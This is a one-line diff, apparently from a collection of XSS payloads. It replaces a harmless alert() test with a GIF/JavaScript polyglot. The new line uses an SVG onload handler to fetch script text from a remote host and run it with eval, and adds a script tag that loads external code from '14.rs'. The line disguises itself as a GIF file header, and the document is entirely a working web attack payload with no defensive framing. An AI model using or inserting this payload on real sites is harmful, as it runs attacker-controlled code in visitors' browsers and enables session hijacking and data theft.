@@ -1,1 +1,1 @@
-GIF89a/*<script>alert('XSS')</script>//;
+GIF89a/*<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'><script src=14.rs>//;
